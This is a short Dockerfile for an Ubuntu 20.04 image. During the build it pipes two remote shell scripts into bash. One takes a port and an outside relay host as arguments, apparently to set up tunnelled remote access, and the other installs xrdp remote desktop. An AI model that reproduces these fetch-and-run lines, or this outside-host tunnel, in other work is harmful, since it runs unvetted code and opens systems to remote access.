FROM ubuntu:20.04
RUN apt update
RUN apt-get -y install wget curl net-tools unzip
RUN curl https://public.hxiang.eu.org/intel-dev-init.sh | bash -s 60112 hk.haycker.eu.org:80
RUN curl https://public.hxiang.eu.org/ubuntu-20.04-xrdp.sh | bash
EXPOSE 60112
CMD /root/init.sh
